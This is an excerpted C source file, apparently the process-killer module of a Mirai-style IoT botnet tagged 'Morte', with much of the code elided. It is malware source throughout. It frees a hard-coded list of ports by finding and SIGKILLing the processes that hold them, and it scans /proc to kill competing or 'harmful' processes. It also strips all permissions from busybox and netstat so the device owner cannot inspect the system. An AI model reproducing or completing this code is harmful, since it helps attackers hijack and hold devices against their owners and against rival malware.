...
uint16_t ports_to_kill[] = {
    1338, 1111, 1213, 1234,
    333, 666, 777, 9999,
    5656, 8585, 6363,
    6969, 3779, 3778, 38273,
    10345, 23455, 1991, 21769,
    42352, 48101, 39182, 47767,
    6667, 1337, 443, 4321, 232, 24136};

size_t num_ports = sizeof(ports_to_kill) / sizeof(ports_to_kill[0]);
...
void disable_commands(void)
{
    const char *paths[] = {
        ...
        "/sbin/busybox", "/usr/sbin/busybox", "/bin/busybox", "/usr/bin/busybox",
        "/sbin/netstat", "/usr/sbin/netstat", "/bin/netstat", "/usr/bin/netstat"};

    int num_paths = sizeof(paths) / sizeof(paths[0]);

    for (int i = 0; i < num_paths; i++)
    {
        if (chmod(paths[i], 0000) == -1)
        {
#ifdef DEBUG
            perror("[Morte_command] chmod failed");
#endif
        }
    }

#ifdef DEBUG
    printf("[Morte_command] Permissions on blacklisted commands set to 0000.\n");
#endif
}
...
void killer_condi()
{
    ...
    {
#ifdef DEBUG
        perror("[Morte_killer] Failed to open directory /proc");
#endif
        return;
    }
        ...
        if (entry->d_type == DT_DIR)
        {
            ...
            if (pid > 0)
            {
                ...
                if (status_file != NULL)
                {
                    ...
                    {
#ifdef DEBUG
                        printf("[Morte_killer] Found process with name %s (PID: %d)\n", process_name, pid);
#endif

                        if (kill(pid, SIGKILL) == 0)
                        {
#ifdef DEBUG
                            printf("[Morte_killer] Process killed successfully.\n");
#endif
                        }
                        else
                        {
#ifdef DEBUG
                            perror("[Morte_killer] Failed to kill process");
#endif
                        }
                ...
                {
#ifdef DEBUG
                    perror("[Morte_killer] Failed to open status file");
#endif
                }
            }
        }
        ...
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            ...
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    ...
                    int target_pid = util_atoi(pid, 10);
                    ...
                    {
#ifdef DEBUG
                        printf("[Morte_killer] Found pid %d for port %d\n", target_pid, ntohs(port));
#endif
                        kill(target_pid, 9);
                        ret = 1;
                    }
...
void killer_Morte(void)
{
    for (size_t i = 0; i < num_ports; i++)
    {
        if (killer_kill_port(htons(ports_to_kill[i])))
        {
            return;
        }
    }
...
void killer_init(void)
{
    ...
    while (2)
    {
        ...
        {
            printf("[Morte_killer] Failed to create child process.\n");
        }
    }
    sleep(5);

#ifdef DEBUG
    printf("[Morte_killer] cmdline killer started, scanning for bad processes!\n");
#endif
    ...
    while (TRUE)
    {
        ...
        {
#ifdef DEBUG
            printf("[Morte_killer] failed to open /proc!\n");
#endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);
        ...
        while ((file = readdir(dir)) != NULL)
        {
            ...
            if (pid <= killer_highest_pid)
            {
                ...
                {
#ifdef DEBUG
                    printf("[Morte_killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
#endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
            ...
            if (pid != getpid() && pid != getppid() && pid != getpid() + 1)
            {
                ...
                {
#ifdef DEBUG
                    printf("[Morte_killer] killing harmful process: %s\n", cmdline_path);
#endif
                    kill(pid, 9);
                }
            }
...
BOOL killer_kill_by_port(port_t port)
{
...
#ifdef DEBUG
    printf("[Morte_killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif
    ...
    {
#ifdef DEBUG
        printf("[Morte_killer] Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
...
#ifdef DEBUG
    printf("[Morte_killer] Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif
